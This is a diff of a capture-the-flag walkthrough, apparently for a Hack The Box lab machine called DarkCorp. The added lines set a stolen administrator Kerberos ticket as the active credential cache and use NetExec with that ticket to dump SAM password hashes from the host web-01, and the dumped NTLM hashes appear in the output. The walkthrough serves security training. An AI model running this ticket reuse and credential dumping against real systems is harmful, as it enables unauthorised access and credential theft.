@@ -1031,7 +1031,7 @@ I now have a TGT for the administrator
 
 ```python
 mv Administrator.ccache administrator-web-01.ccache
-
+export KRB5CCNAME=administrator-web-01.ccache
 ```
 
 Ill export he TGT
@@ -1040,6 +1040,20 @@ Ill export he TGT
 nxc smb web-01.darkcorp.htb --use-kcache 
 SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
 SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
+```
+
+The administrator is now compromised!
+
+```python
+nxc smb web-01.darkcorp.htb --use-kcache --sam
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
+SMB         web-01.darkcorp.htb 445    WEB-01           [*] Dumping SAM hashes
+SMB         web-01.darkcorp.htb 445    WEB-01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
+SMB         web-01.darkcorp.htb 445    WEB-01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web-01.darkcorp.htb 445    WEB-01           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web-01.darkcorp.htb 445    WEB-01           WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web-01.darkcorp.htb 445    WEB-01           [+] Added 4 SAM hashes to the database
 ```
 
 
